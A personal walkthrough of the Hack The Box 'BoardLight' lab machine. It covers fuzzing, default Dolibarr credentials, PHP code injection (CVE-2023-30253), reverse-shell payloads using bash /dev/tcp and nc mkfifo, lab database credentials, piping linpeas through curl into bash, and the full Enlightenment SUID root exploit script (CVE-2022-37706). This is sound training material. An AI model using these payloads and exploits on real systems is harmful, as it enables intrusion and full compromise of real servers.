# NOTE: IPPSec video is a must watch. explains in detail with code analysis and goes beyond scope. Has a lot of good information
## Reconnaissance
- 10.10.11.11
- port 80 : BoardLight
- can submit message (maybe RCE via that?)
- dirbuster finds some js code files.
- ffuf for fuzzing url
```
ffuf -u http://board.htb/ -w /usr/share/seclists/Discovery/Web-Content/big.txt   -H "Host:FUZZ.board.htb" -fs 15949
```
- We find crm.board.htb and att to /etc/hosts file
- This url leads us to login page.
- on searching google we see default creds is admin/admin
- We also see the version and on searching online we see it has a vulnerability : PHP code injection
- also has a github which automates it.
```
https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
```
- pass after logging in with creds- Gain access as www-data
## Manual method
- create new website
- add php code in Edit HTML Source
- pass php command to check
- doesn't work but we see that its case sensitive and can pass if we make any or all characters in PHP uppercase
- pass command with new knowledge
```
<?PHP echo system("whoami");?>
OR
<?pHp phpinfo();?>
```
- save and click Preview page.
- - pass reverse shell 
```
<?php system(bash -c 'bash -i >& /dev/tcp/<local_ip>/9998 0>&1'); ?>
```
- main exploit (from writeup htb):
```
<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc
10.10.14.25 4455 >/tmp/f");?
```
- In the payload above, the PHP code utilizes the system() function to execute a shell command on the server. The command first removes any existing named pipe at /tmp/f to ensure there is no conflict. It then creates a new named pipe in the same location. The command reads from the named pipe, while cat /tmp/f /bin/sh -i 2>&1 starts an interactive shell, redirecting both standard output and error to the named pipe. Finally, the nc 10.10.14.41 4455 > /tmp/f command connects to our IP address on port 4455 using Netcat , allowing the input and output of the shell to flow through the named pipe. This setup effectively creates a reverse shell connection back to our listener, enabling remote command execution on the target system	 
- also pass php-reverse-shell.py (pentestmonkey) into it and that works too.
- for both i keep netcat listener open on required port.
- we check user and we are www-data
  
## Enumerating as www-data and Gaining initial foothold
- on enumerating we find htdocs, which holds a conf folder and a conf file.
- within that we find a dbuser and password.
```
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
```
- I checked /home and found a larissa directory which implies a user named larissa.
- Can also check(more ideal enumeration)
```
cat /etc/passwd | grep "sh$" # or grep "sh" too
```
- shows user larissa can run bash
- ssh into machine with db_pass.
- **NOTE: Yes, can fall into a rabbit hole here as db_pass doesn't imply user pass. Definitely check IPPSec for a more detailed explanation but we eventually find some info enumerating. but it helps with the priv escalation anyway. Bottom line the code checks if user belongs to any user or groups and if not it can't execute the exploit. user larissa is part of adm group which is part of that list and thus can.)**
- 
## Privilege Escalation
- can send linpeas by first getting it from local machine, and starting a server:
```
sudo python3 -m http.server 9898
```
- call linpeas from target
```
wget http://10.10.14.25(source_ _addr):9898/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
OR
curl http://10.10.14.25:9898/linpeas.sh|bash #to execute without downloading
```
- On enumerating we find some setuid files which are interesting. this can also be found by enumerating  with find for setuid:
```
find / -type f -perm -4000 2>/dev/null
```
- We find an enlightenment file which is unusual
- can't execute this as www-data
- can check version with larissa
```
englightenment --version
```
- we find it to be 0.23.1
- On searching online enlightenment has an exploit CVE-2022-37706
- We download from exploit.db url :
		https://www.exploit-db.com/exploits/51180
- and send it to target just like we did with linpeas and www-data user. Need to edit the exploit to only include the bash code within it.
```
wget http://10.10.14.25:9898/51180.txt
cat 51180.txt # copy bash code only
vi exploit.sh # paste bash code
chmod +x exploit.sh
./exploit.sh
whoami
```
- We gain root privileges
- root flag at /root/
---
## Root Priv Esc exploit in detail
- **NOTE: We can understand why better from IPPSecs source code analysis which basically calls a bash file. (there is an even better explanation of the actual exploit for root which is shown below and explains the directory path having ;, abd the weird // and all to bypass the codes restrictions to pass the exploit) long story short, in the main code it checks for the length which requires it to be around 6 characters and hence the extra // to pass that check. Many more checks  explained in his video and how this exploit passes through it.**
```
#!/bin/bash
echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
        echo "[-] Couldn't find the vulnerable SUID file..."
        echo "[*] Enlightenment should be installed on your system."
        exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o 
#MAIN PART OF EXPLOIT
noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```
----
